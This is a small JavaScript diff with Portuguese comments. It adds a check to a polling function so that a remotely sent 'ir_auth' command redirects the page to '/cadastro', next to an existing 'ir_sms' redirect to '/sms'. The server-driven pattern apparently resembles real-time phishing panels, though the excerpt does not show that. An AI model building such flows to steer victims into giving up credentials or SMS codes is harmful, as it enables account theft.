@@ -172,6 +172,14 @@ const monitorClient = async (
         }
         
         // Verificar redirecionamentos baseados no response ou command dentro de data
+        if (clientData.data?.response === "ir_auth" || clientData.data?.command === "ir_auth") {
+          console.log('Detectado ir_auth - Redirecionando para /cadastro');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/cadastro');
+          return;
+        }
+        
         if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
           console.log('Detectado ir_sms - Redirecionando para /sms');
           clearInterval(intervalId);
